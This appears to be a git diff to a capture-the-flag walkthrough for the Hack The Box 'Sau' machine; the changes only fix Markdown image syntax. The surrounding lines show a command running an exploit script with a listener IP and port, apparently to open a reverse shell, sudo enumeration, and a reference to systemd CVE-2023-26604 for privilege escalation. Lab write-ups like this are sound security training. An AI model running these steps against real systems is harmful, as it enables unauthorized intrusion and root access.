@@ -80,7 +80,7 @@ python3 exploit.py 10.10.14.246 4444 http://10.129.189.107:55555/rcwlye
 
 ```
 
-!\[b\](/images/images-sau/image_08.png)
+![b](/images/images-sau/image_08.png)
 
 ###### What is the full path to the binary (without arguments) that the puma user can run as root on Sau?
 
@@ -90,7 +90,7 @@ Let's see what puma can run as root.
 sudo -l
 ```
 
-!\[b\](/images/images-sau/image_09.png)
+![b](/images/images-sau/image_09.png)
 
 ###### What is the full version string for the instance of systemd installed on Sau?
 
@@ -98,13 +98,13 @@ sudo -l
 /usr/bin/systemctl --version
 ```
 
-!\[b\](/images/images-sau/image_10.png)
+![b](/images/images-sau/image_10.png)
 
 ###### What is the 2023 CVE ID for a local privilege escalation vulnerability in this version of systemd?
 
 A quick Google search revealed the ID right away.
 
-!\[b\](/images/images-sau/image_11.png)
+![b](/images/images-sau/image_11.png)
 
 ###### Submit the flag located in the root user's home directory.
 
@@ -112,4 +112,4 @@ To get the root user's flag, we need to escalate privileges with the previously 
 
 https://medium.com/@zenmoviefornotification/saidov-maxim-cve-2023-26604-c1232a526ba7
 
-!\[b\](/images/images-sau/image_12.png)
+![b](/images/images-sau/image_12.png)
